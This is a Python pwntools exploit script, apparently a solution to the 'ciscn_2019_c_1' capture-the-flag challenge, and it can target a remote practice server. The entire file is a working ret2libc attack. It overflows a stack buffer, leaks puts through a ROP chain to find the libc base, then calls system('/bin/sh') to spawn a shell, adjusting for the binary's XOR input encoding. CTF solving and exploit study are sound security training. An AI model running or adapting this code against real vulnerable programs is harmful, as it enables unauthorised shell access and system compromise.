from pwn import *
import string
context.binary = './ciscn_2019_c_1'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20115)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./ciscn_2019_c_1')

def dbg():
	raw_input()


def encrypt(src):
	dest = ''
	for i in src:
		tmp = ord(i)
		if 97<=tmp and tmp <=122:
			dest += chr(tmp ^ 0xd)
		elif 65<=tmp and tmp <= 90:
			dest += chr(tmp ^ 0xe)
		elif 48<=tmp and tmp <= 57:
			dest += chr(tmp ^ 0xf)
		else:
			dest += chr(tmp)
	return dest

def decrypt(src):
	dest = ''
	for i in src:
		if i in en_az:
			dest += chr(ord(i) ^ 0xd)
		elif i in en_AZ:
			dest += chr(ord(i) ^ 0xe)
		elif i in en_09:
			dest += chr(ord(i) ^ 0xf)
		else:
			dest += i
	return dest



en_az = encrypt(string.ascii_lowercase)
en_AZ  = encrypt(string.ascii_uppercase)
en_09 = encrypt('0123456789')

caution = string.ascii_lowercase + string.ascii_uppercase + string.digits
en_en_az = encrypt(en_az)
en_en_AZ = encrypt(en_AZ)
en_en_09 = encrypt(en_09)

"""
print(en_az)
print(en_en_az)
print(en_09)
print(en_en_09)
print(en_AZ)
print(en_en_AZ)

"""
ext = '012345' + 'mpqrsv' + 'MNPORSU'


pop_rdi = 0x0000000000400c83 # pop rdi ; ret
pop_rsi = 0x0000000000400c81 # pop rsi ; pop r15 ; ret
main = 0x400b28

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

p.recvuntil('Input your choice!\n')
p.sendline('1')
payload = 'a'*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

for i in payload:
	if i in ext:
		print i
p.sendline(encrypt(payload))
p.recvline()
p.recvline()

#gdb.attach(p, 'b* 0x400AEE')
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base+0x18cd57

gadget = 0x4526a + libc_base #0xf02a4 0xf1147 0x45216 0x4526a

p.recvuntil('Input your choice!\n')
p.sendline('1')
payload = 'a'*0x58 + p64(pop_rdi) + p64(binsh) + p64(system_addr)

for i in payload:
	if i in ext:
		print "wa ==> " + hex(ord(i)) + i
	elif i in caution:
		print "caution ==> " + hex(ord(i)) + i

p.sendline(payload)			

print "puts_addr ==> " + hex(puts_addr)
print "system_addr ==> " + hex(system_addr)
print "binsh ==> " + hex(binsh)
print "gadget ==> " + hex(gadget)
print "libc_base ==> " + hex(libc_base)

p.interactive()
p.close()
